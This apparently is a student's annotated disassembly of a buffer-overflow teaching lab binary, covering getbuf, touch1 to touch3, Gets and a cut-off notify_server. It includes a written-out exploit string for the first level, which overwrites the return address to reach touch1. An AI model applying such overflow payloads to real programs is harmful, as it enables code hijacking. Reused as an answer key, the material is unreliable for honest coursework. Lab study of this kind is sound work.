  4012d2:	69 c0 8c 5d 00 00    	imul   $0x5d8c,%eax,%eax
  4012d8:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  4012dc:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  4012e0:	69 c0 b6 68 00 00    	imul   $0x68b6,%eax,%eax
  4012e6:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  4012ea:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  4012ee:	69 c0 11 f5 00 00    	imul   $0xf511,%eax,%eax
  4012f4:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  4012f8:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  4012fc:	69 c0 64 0a 00 00    	imul   $0xa64,%eax,%eax
  401302:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  401306:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  40130a:	69 c0 c9 5d 00 00    	imul   $0x5dc9,%eax,%eax
  401310:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  401314:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  401318:	69 c0 fd 0c 00 00    	imul   $0xcfd,%eax,%eax
  40131e:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  401322:	8b 44 24 d0          	mov    -0x30(%rsp),%eax
  401326:	69 c0 00 73 00 00    	imul   $0x7300,%eax,%eax
  40132c:	89 44 24 d0          	mov    %eax,-0x30(%rsp)
  401330:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  401334:	69 c0 0b 6a 00 00    	imul   $0x6a0b,%eax,%eax
  40133a:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  40133e:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  401342:	69 c0 63 d6 00 00    	imul   $0xd663,%eax,%eax
  401348:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  40134c:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  401350:	69 c0 dd 10 00 00    	imul   $0x10dd,%eax,%eax
  401356:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  40135a:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  40135e:	69 c0 0a a4 00 00    	imul   $0xa40a,%eax,%eax
  401364:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  401368:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  40136c:	69 c0 b2 46 00 00    	imul   $0x46b2,%eax,%eax
  401372:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  401376:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  40137a:	69 c0 47 74 00 00    	imul   $0x7447,%eax,%eax
  401380:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  401384:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  401388:	69 c0 55 7f 00 00    	imul   $0x7f55,%eax,%eax
  40138e:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  401392:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  401396:	69 c0 b4 9c 00 00    	imul   $0x9cb4,%eax,%eax
  40139c:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  4013a0:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  4013a4:	69 c0 03 07 00 00    	imul   $0x703,%eax,%eax
  4013aa:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  4013ae:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  4013b2:	69 c0 3a af 00 00    	imul   $0xaf3a,%eax,%eax
  4013b8:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  4013bc:	8b 44 24 e0          	mov    -0x20(%rsp),%eax
  4013c0:	69 c0 b1 c9 00 00    	imul   $0xc9b1,%eax,%eax
  4013c6:	89 44 24 e0          	mov    %eax,-0x20(%rsp)
  4013ca:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  4013ce:	69 c0 33 34 00 00    	imul   $0x3433,%eax,%eax
  4013d4:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  4013d8:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  4013dc:	69 c0 b5 a2 00 00    	imul   $0xa2b5,%eax,%eax
  4013e2:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  4013e6:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  4013ea:	69 c0 07 a6 00 00    	imul   $0xa607,%eax,%eax
  4013f0:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  4013f4:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  4013f8:	69 c0 5c b4 00 00    	imul   $0xb45c,%eax,%eax
  4013fe:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  401402:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  401406:	69 c0 9e cf 00 00    	imul   $0xcf9e,%eax,%eax
  40140c:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  401410:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  401414:	69 c0 b9 6c 00 00    	imul   $0x6cb9,%eax,%eax
  40141a:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  40141e:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  401422:	69 c0 29 3c 00 00    	imul   $0x3c29,%eax,%eax
  401428:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  40142c:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  401430:	69 c0 ff 18 00 00    	imul   $0x18ff,%eax,%eax
  401436:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  40143a:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  40143e:	69 c0 bd 04 00 00    	imul   $0x4bd,%eax,%eax
  401444:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  401448:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  40144c:	69 c0 76 fb 00 00    	imul   $0xfb76,%eax,%eax
  401452:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  401456:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  40145a:	69 c0 5c 45 00 00    	imul   $0x455c,%eax,%eax
  401460:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  401464:	8b 44 24 e0          	mov    -0x20(%rsp),%eax
  401468:	69 c0 c0 10 00 00    	imul   $0x10c0,%eax,%eax
  40146e:	89 44 24 e0          	mov    %eax,-0x20(%rsp)
  401472:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  401476:	69 c0 29 30 00 00    	imul   $0x3029,%eax,%eax
  40147c:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  401480:	8b 44 24 e0          	mov    -0x20(%rsp),%eax
  401484:	69 c0 50 dc 00 00    	imul   $0xdc50,%eax,%eax
  40148a:	89 44 24 e0          	mov    %eax,-0x20(%rsp)
  40148e:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  401492:	69 c0 7d 87 00 00    	imul   $0x877d,%eax,%eax
  401498:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  40149c:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  4014a0:	69 c0 b0 83 00 00    	imul   $0x83b0,%eax,%eax
  4014a6:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  4014aa:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  4014ae:	69 c0 17 7a 00 00    	imul   $0x7a17,%eax,%eax
  4014b4:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  4014b8:	8b 44 24 d0          	mov    -0x30(%rsp),%eax
  4014bc:	69 c0 ad 4d 00 00    	imul   $0x4dad,%eax,%eax
  4014c2:	89 44 24 d0          	mov    %eax,-0x30(%rsp)
  4014c6:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  4014ca:	69 c0 17 d6 00 00    	imul   $0xd617,%eax,%eax
  4014d0:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  4014d4:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  4014d8:	69 c0 26 39 00 00    	imul   $0x3926,%eax,%eax
  4014de:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  4014e2:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  4014e6:	69 c0 71 20 00 00    	imul   $0x2071,%eax,%eax
  4014ec:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  4014f0:	8b 44 24 e8          	mov    -0x18(%rsp),%eax
  4014f4:	69 c0 b7 4b 00 00    	imul   $0x4bb7,%eax,%eax
  4014fa:	89 44 24 e8          	mov    %eax,-0x18(%rsp)
  4014fe:	8b 44 24 e8          	mov    -0x18(%rsp),%eax
  401502:	69 c0 76 23 00 00    	imul   $0x2376,%eax,%eax
  401508:	89 44 24 e8          	mov    %eax,-0x18(%rsp)
  40150c:	8b 44 24 e8          	mov    -0x18(%rsp),%eax
  401510:	69 c0 cd 3c 00 00    	imul   $0x3ccd,%eax,%eax
  401516:	89 44 24 e8          	mov    %eax,-0x18(%rsp)
  40151a:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  40151e:	69 c0 67 c4 00 00    	imul   $0xc467,%eax,%eax
  401524:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  401528:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  40152c:	69 c0 39 a1 00 00    	imul   $0xa139,%eax,%eax
  401532:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  401536:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  40153a:	69 c0 0f b3 00 00    	imul   $0xb30f,%eax,%eax
  401540:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  401544:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  401548:	69 c0 d3 eb 00 00    	imul   $0xebd3,%eax,%eax
  40154e:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  401552:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  401556:	69 c0 bc c9 00 00    	imul   $0xc9bc,%eax,%eax
  40155c:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  401560:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  401564:	69 c0 9d c2 00 00    	imul   $0xc29d,%eax,%eax
  40156a:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  40156e:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  401572:	69 c0 25 6e 00 00    	imul   $0x6e25,%eax,%eax
  401578:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  40157c:	8b 44 24 e0          	mov    -0x20(%rsp),%eax
  401580:	69 c0 ea 0c 00 00    	imul   $0xcea,%eax,%eax
  401586:	89 44 24 e0          	mov    %eax,-0x20(%rsp)
  40158a:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  40158e:	69 c0 b2 6c 00 00    	imul   $0x6cb2,%eax,%eax
  401594:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  401598:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  40159c:	69 c0 5a 08 00 00    	imul   $0x85a,%eax,%eax
  4015a2:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  4015a6:	8b 44 24 e8          	mov    -0x18(%rsp),%eax
  4015aa:	69 c0 a1 5c 00 00    	imul   $0x5ca1,%eax,%eax
  4015b0:	89 44 24 e8          	mov    %eax,-0x18(%rsp)
  4015b4:	8b 44 24 e0          	mov    -0x20(%rsp),%eax
  4015b8:	69 c0 7e e8 00 00    	imul   $0xe87e,%eax,%eax
  4015be:	89 44 24 e0          	mov    %eax,-0x20(%rsp)
  4015c2:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  4015c6:	69 c0 60 e7 00 00    	imul   $0xe760,%eax,%eax
  4015cc:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  4015d0:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  4015d4:	69 c0 ac d9 00 00    	imul   $0xd9ac,%eax,%eax
  4015da:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  4015de:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  4015e2:	69 c0 eb 98 00 00    	imul   $0x98eb,%eax,%eax
  4015e8:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  4015ec:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  4015f0:	69 c0 0a 33 00 00    	imul   $0x330a,%eax,%eax
  4015f6:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  4015fa:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  4015fe:	69 c0 bc 4e 00 00    	imul   $0x4ebc,%eax,%eax
  401604:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  401608:	8b 44 24 e0          	mov    -0x20(%rsp),%eax
  40160c:	69 c0 16 67 00 00    	imul   $0x6716,%eax,%eax
  401612:	89 44 24 e0          	mov    %eax,-0x20(%rsp)
  401616:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  40161a:	69 c0 3c 86 00 00    	imul   $0x863c,%eax,%eax
  401620:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  401624:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  401628:	69 c0 05 e5 00 00    	imul   $0xe505,%eax,%eax
  40162e:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  401632:	8b 44 24 e0          	mov    -0x20(%rsp),%eax
  401636:	69 c0 0d 1b 00 00    	imul   $0x1b0d,%eax,%eax
  40163c:	89 44 24 e0          	mov    %eax,-0x20(%rsp)
  401640:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  401644:	69 c0 32 a1 00 00    	imul   $0xa132,%eax,%eax
  40164a:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  40164e:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  401652:	69 c0 ef ed 00 00    	imul   $0xedef,%eax,%eax
  401658:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  40165c:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  401660:	69 c0 6e 71 00 00    	imul   $0x716e,%eax,%eax
  401666:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  40166a:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  40166e:	69 c0 b4 08 00 00    	imul   $0x8b4,%eax,%eax
  401674:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  401678:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  40167c:	69 c0 6a 9d 00 00    	imul   $0x9d6a,%eax,%eax
  401682:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  401686:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  40168a:	69 c0 49 bb 00 00    	imul   $0xbb49,%eax,%eax
  401690:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  401694:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  401698:	69 c0 67 e2 00 00    	imul   $0xe267,%eax,%eax
  40169e:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  4016a2:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  4016a6:	69 c0 1e ba 00 00    	imul   $0xba1e,%eax,%eax
  4016ac:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  4016b0:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  4016b4:	69 c0 80 ad 00 00    	imul   $0xad80,%eax,%eax
  4016ba:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  4016be:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  4016c2:	69 c0 8c d2 00 00    	imul   $0xd28c,%eax,%eax
  4016c8:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  4016cc:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  4016d0:	69 c0 5c b0 00 00    	imul   $0xb05c,%eax,%eax
  4016d6:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  4016da:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  4016de:	69 c0 ce b4 00 00    	imul   $0xb4ce,%eax,%eax
  4016e4:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  4016e8:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  4016ec:	69 c0 14 23 00 00    	imul   $0x2314,%eax,%eax
  4016f2:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  4016f6:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  4016fa:	69 c0 5d 6a 00 00    	imul   $0x6a5d,%eax,%eax
  401700:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  401704:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  401708:	69 c0 03 8b 00 00    	imul   $0x8b03,%eax,%eax
  40170e:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  401712:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  401716:	69 c0 bb af 00 00    	imul   $0xafbb,%eax,%eax
  40171c:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  401720:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  401724:	69 c0 9d 0e 00 00    	imul   $0xe9d,%eax,%eax
  40172a:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  40172e:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  401732:	69 c0 52 da 00 00    	imul   $0xda52,%eax,%eax
  401738:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  40173c:	ba 00 00 00 00       	mov    $0x0,%edx
  401741:	b8 00 00 00 00       	mov    $0x0,%eax
  401746:	eb 0b                	jmp    401753 <scramble+0x4b0>
  401748:	89 d1                	mov    %edx,%ecx
  40174a:	8b 4c 8c d0          	mov    -0x30(%rsp,%rcx,4),%ecx
  40174e:	01 c8                	add    %ecx,%eax
  401750:	83 c2 01             	add    $0x1,%edx
  401753:	83 fa 09             	cmp    $0x9,%edx
  401756:	76 f0                	jbe    401748 <scramble+0x4a5>
  401758:	f3 c3                	repz retq 

000000000040175a <getbuf>:
  40175a:	48 83 ec 18          	sub    $0x18,%rsp
  40175e:	48 89 e7             	mov    %rsp,%rdi
  401761:	e8 34 02 00 00       	callq  40199a <Gets>
  401766:	b8 01 00 00 00       	mov    $0x1,%eax
  40176b:	48 83 c4 18          	add    $0x18,%rsp
  40176f:	c3                   	retq   

0000000000401770 <touch1>:
  401770:	48 83 ec 08          	sub    $0x8,%rsp
  401774:	c7 05 7e 2d 20 00 01 	movl   $0x1,0x202d7e(%rip)        # 6044fc <vlevel>
  40177b:	00 00 00 
  40177e:	bf d7 2f 40 00       	mov    $0x402fd7,%edi
  401783:	e8 c8 f4 ff ff       	callq  400c50 <puts@plt>
  401788:	bf 01 00 00 00       	mov    $0x1,%edi
  40178d:	e8 f7 03 00 00       	callq  401b89 <validate>
  401792:	bf 00 00 00 00       	mov    $0x0,%edi
  401797:	e8 54 f6 ff ff       	callq  400df0 <exit@plt>

#solution for problem 1
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 70 17 40 00 

#solution for problem 2


000000000040179c <touch2>:
  40179c:	48 83 ec 08          	sub    $0x8,%rsp
  4017a0:	89 fe                	mov    %edi,%esi
  4017a2:	c7 05 50 2d 20 00 02 	movl   $0x2,0x202d50(%rip)        # 6044fc <vlevel>
  4017a9:	00 00 00 
  4017ac:	3b 3d 52 2d 20 00    	cmp    0x202d52(%rip),%edi        # 604504 <cookie>
  4017b2:	75 1b                	jne    4017cf <touch2+0x33>
  4017b4:	bf 00 30 40 00       	mov    $0x403000,%edi
  4017b9:	b8 00 00 00 00       	mov    $0x0,%eax
  4017be:	e8 bd f4 ff ff       	callq  400c80 <printf@plt>
  4017c3:	bf 02 00 00 00       	mov    $0x2,%edi
  4017c8:	e8 bc 03 00 00       	callq  401b89 <validate>
  4017cd:	eb 19                	jmp    4017e8 <touch2+0x4c>
  4017cf:	bf 28 30 40 00       	mov    $0x403028,%edi
  4017d4:	b8 00 00 00 00       	mov    $0x0,%eax
  4017d9:	e8 a2 f4 ff ff       	callq  400c80 <printf@plt>
  4017de:	bf 02 00 00 00       	mov    $0x2,%edi
  4017e3:	e8 53 04 00 00       	callq  401c3b <fail>
  4017e8:	bf 00 00 00 00       	mov    $0x0,%edi
  4017ed:	e8 fe f5 ff ff       	callq  400df0 <exit@plt>

00000000004017f2 <hexmatch>:
  4017f2:	41 54                	push   %r12
  4017f4:	55                   	push   %rbp
  4017f5:	53                   	push   %rbx
  4017f6:	48 83 ec 70          	sub    $0x70,%rsp
  4017fa:	41 89 fc             	mov    %edi,%r12d
  4017fd:	48 89 f5             	mov    %rsi,%rbp
  401800:	e8 4b f5 ff ff       	callq  400d50 <random@plt>
  401805:	48 89 c1             	mov    %rax,%rcx
  401808:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
  40180f:	0a d7 a3 
  401812:	48 f7 ea             	imul   %rdx
  401815:	48 8d 04 0a          	lea    (%rdx,%rcx,1),%rax
  401819:	48 c1 f8 06          	sar    $0x6,%rax
  40181d:	48 89 ce             	mov    %rcx,%rsi
  401820:	48 c1 fe 3f          	sar    $0x3f,%rsi
  401824:	48 29 f0             	sub    %rsi,%rax
  401827:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  40182b:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  40182f:	48 c1 e0 02          	shl    $0x2,%rax
  401833:	48 29 c1             	sub    %rax,%rcx
  401836:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx
  40183a:	44 89 e2             	mov    %r12d,%edx
  40183d:	be f4 2f 40 00       	mov    $0x402ff4,%esi
  401842:	48 89 df             	mov    %rbx,%rdi
  401845:	b8 00 00 00 00       	mov    $0x0,%eax
  40184a:	e8 91 f5 ff ff       	callq  400de0 <sprintf@plt>
  40184f:	ba 09 00 00 00       	mov    $0x9,%edx
  401854:	48 89 de             	mov    %rbx,%rsi
  401857:	48 89 ef             	mov    %rbp,%rdi
  40185a:	e8 d1 f3 ff ff       	callq  400c30 <strncmp@plt>
  40185f:	85 c0                	test   %eax,%eax
  401861:	0f 94 c0             	sete   %al
  401864:	0f b6 c0             	movzbl %al,%eax
  401867:	48 83 c4 70          	add    $0x70,%rsp
  40186b:	5b                   	pop    %rbx
  40186c:	5d                   	pop    %rbp
  40186d:	41 5c                	pop    %r12
  40186f:	c3                   	retq   

0000000000401870 <touch3>:
  401870:	53                   	push   %rbx	
  401871:	48 89 fb             	mov    %rdi,%rbx	
  401874:	c7 05 7e 2c 20 00 03 	movl   $0x3,0x202c7e(%rip)        # 6044fc <vlevel>
  40187b:	00 00 00 
  40187e:	48 89 fe             	mov    %rdi,%rsi
  401881:	8b 3d 7d 2c 20 00    	mov    0x202c7d(%rip),%edi        # 604504 <cookie>

  401887:	e8 66 ff ff ff       	callq  4017f2 <hexmatch>	# arg1 = cookie string rep address
  40188c:	85 c0                	test   %eax,%eax	# if hexmatch(cookie, sval) == 0
  40188e:	74 1e                	je     4018ae <touch3+0x3e>	# goto .failed

  401890:	48 89 de             	mov    %rbx,%rsi
  401893:	bf 50 30 40 00       	mov    $0x403050,%edi
  401898:	b8 00 00 00 00       	mov    $0x0,%eax
  40189d:	e8 de f3 ff ff       	callq  400c80 <printf@plt>
  4018a2:	bf 03 00 00 00       	mov    $0x3,%edi
  4018a7:	e8 dd 02 00 00       	callq  401b89 <validate>
  4018ac:	eb 1c                	jmp    4018ca <touch3+0x5a>

#failed
  4018ae:	48 89 de             	mov    %rbx,%rsi
  4018b1:	bf 78 30 40 00       	mov    $0x403078,%edi
  4018b6:	b8 00 00 00 00       	mov    $0x0,%eax
  4018bb:	e8 c0 f3 ff ff       	callq  400c80 <printf@plt>
  4018c0:	bf 03 00 00 00       	mov    $0x3,%edi
  4018c5:	e8 71 03 00 00       	callq  401c3b <fail>

#passed
  4018ca:	bf 00 00 00 00       	mov    $0x0,%edi
  4018cf:	e8 1c f5 ff ff       	callq  400df0 <exit@plt>

00000000004018d4 <test>:
  4018d4:	48 83 ec 08          	sub    $0x8,%rsp
  4018d8:	b8 00 00 00 00       	mov    $0x0,%eax
  4018dd:	e8 78 fe ff ff       	callq  40175a <getbuf>
  4018e2:	89 c6                	mov    %eax,%esi
  4018e4:	bf a0 30 40 00       	mov    $0x4030a0,%edi
  4018e9:	b8 00 00 00 00       	mov    $0x0,%eax
  4018ee:	e8 8d f3 ff ff       	callq  400c80 <printf@plt>
  4018f3:	48 83 c4 08          	add    $0x8,%rsp
  4018f7:	c3                   	retq   
  4018f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4018ff:	00 

0000000000401900 <save_char>:
  401900:	8b 05 1e 38 20 00    	mov    0x20381e(%rip),%eax        # 605124 <gets_cnt>
  401906:	3d ff 03 00 00       	cmp    $0x3ff,%eax
  40190b:	7f 49                	jg     401956 <save_char+0x56>
  40190d:	8d 14 40             	lea    (%rax,%rax,2),%edx
  401910:	89 f9                	mov    %edi,%ecx
  401912:	c0 e9 04             	shr    $0x4,%cl
  401915:	83 e1 0f             	and    $0xf,%ecx
  401918:	0f b6 b1 c0 33 40 00 	movzbl 0x4033c0(%rcx),%esi
  40191f:	48 63 ca             	movslq %edx,%rcx
  401922:	40 88 b1 20 45 60 00 	mov    %sil,0x604520(%rcx)
  401929:	8d 4a 01             	lea    0x1(%rdx),%ecx
  40192c:	83 e7 0f             	and    $0xf,%edi
  40192f:	0f b6 b7 c0 33 40 00 	movzbl 0x4033c0(%rdi),%esi
  401936:	48 63 c9             	movslq %ecx,%rcx
  401939:	40 88 b1 20 45 60 00 	mov    %sil,0x604520(%rcx)
  401940:	83 c2 02             	add    $0x2,%edx
  401943:	48 63 d2             	movslq %edx,%rdx
  401946:	c6 82 20 45 60 00 20 	movb   $0x20,0x604520(%rdx)
  40194d:	83 c0 01             	add    $0x1,%eax
  401950:	89 05 ce 37 20 00    	mov    %eax,0x2037ce(%rip)        # 605124 <gets_cnt>
  401956:	f3 c3                	repz retq 

0000000000401958 <save_term>:
  401958:	8b 05 c6 37 20 00    	mov    0x2037c6(%rip),%eax        # 605124 <gets_cnt>
  40195e:	8d 04 40             	lea    (%rax,%rax,2),%eax
  401961:	48 98                	cltq   
  401963:	c6 80 20 45 60 00 00 	movb   $0x0,0x604520(%rax)
  40196a:	c3                   	retq   

000000000040196b <check_fail>:
  40196b:	48 83 ec 08          	sub    $0x8,%rsp
  40196f:	0f be 35 b2 37 20 00 	movsbl 0x2037b2(%rip),%esi        # 605128 <target_prefix>
  401976:	b9 20 45 60 00       	mov    $0x604520,%ecx
  40197b:	8b 15 77 2b 20 00    	mov    0x202b77(%rip),%edx        # 6044f8 <check_level>
  401981:	bf c3 30 40 00       	mov    $0x4030c3,%edi
  401986:	b8 00 00 00 00       	mov    $0x0,%eax
  40198b:	e8 f0 f2 ff ff       	callq  400c80 <printf@plt>
  401990:	bf 01 00 00 00       	mov    $0x1,%edi
  401995:	e8 56 f4 ff ff       	callq  400df0 <exit@plt>

000000000040199a <Gets>:
  40199a:	41 54                	push   %r12
  40199c:	55                   	push   %rbp
  40199d:	53                   	push   %rbx
  40199e:	49 89 fc             	mov    %rdi,%r12
  4019a1:	c7 05 79 37 20 00 00 	movl   $0x0,0x203779(%rip)        # 605124 <gets_cnt>
  4019a8:	00 00 00 
  4019ab:	48 89 fb             	mov    %rdi,%rbx
  4019ae:	eb 11                	jmp    4019c1 <Gets+0x27>
  4019b0:	48 8d 6b 01          	lea    0x1(%rbx),%rbp
  4019b4:	88 03                	mov    %al,(%rbx)
  4019b6:	0f b6 f8             	movzbl %al,%edi
  4019b9:	e8 42 ff ff ff       	callq  401900 <save_char>
  4019be:	48 89 eb             	mov    %rbp,%rbx
  4019c1:	48 8b 3d 28 2b 20 00 	mov    0x202b28(%rip),%rdi        # 6044f0 <infile>
  4019c8:	e8 93 f3 ff ff       	callq  400d60 <_IO_getc@plt>
  4019cd:	83 f8 ff             	cmp    $0xffffffff,%eax
  4019d0:	74 05                	je     4019d7 <Gets+0x3d>
  4019d2:	83 f8 0a             	cmp    $0xa,%eax
  4019d5:	75 d9                	jne    4019b0 <Gets+0x16>
  4019d7:	c6 03 00             	movb   $0x0,(%rbx)
  4019da:	b8 00 00 00 00       	mov    $0x0,%eax
  4019df:	e8 74 ff ff ff       	callq  401958 <save_term>
  4019e4:	4c 89 e0             	mov    %r12,%rax
  4019e7:	5b                   	pop    %rbx
  4019e8:	5d                   	pop    %rbp
  4019e9:	41 5c                	pop    %r12
  4019eb:	c3                   	retq   

00000000004019ec <notify_server>:
  4019ec:	83 3d 15 2b 20 00 00 	cmpl   $0x0,0x202b15(%rip)        # 604508 <is_checker>
  4019f3:	0f 85 8e 01 00 00    	jne    401b87 <notify_server+0x19b>
  4019f9:	53                   	push   %rbx
  4019fa:	48 81 ec 10 40 00 00 	sub    $0x4010,%rsp
  401a01:	89 fb                	mov    %edi,%ebx
  401a03:	8b 05 1b 37 20 00    	mov    0x20371b(%rip),%eax        # 605124 <gets_cnt>
  401a09:	83 c0 64             	add    $0x64,%eax
  401a0c:	3d 00 20 00 00       	cmp    $0x2000,%eax
  401a11:	7e 19                	jle    401a2c <notify_server+0x40>
  401a13:	bf f8 31 40 00       	mov    $0x4031f8,%edi
  401a18:	b8 00 00 00 00       	mov    $0x0,%eax
  401a1d:	e8 5e f2 ff ff       	callq  400c80 <printf@plt>
  401a22:	bf 01 00 00 00       	mov    $0x1,%edi
  401a27:	e8 c4 f3 ff ff       	callq  400df0 <exit@plt>
  401a2c:	44 0f be 0d f4 36 20 	movsbl 0x2036f4(%rip),%r9d        # 605128 <target_prefix>
  401a33:	00 
  401a34:	83 3d 6d 2a 20 00 00 	cmpl   $0x0,0x202a6d(%rip)        # 6044a8 <notify>
  401a3b:	74 09                	je     401a46 <notify_server+0x5a>
  401a3d:	44 8b 05 bc 2a 20 00 	mov    0x202abc(%rip),%r8d        # 604500 <authkey>
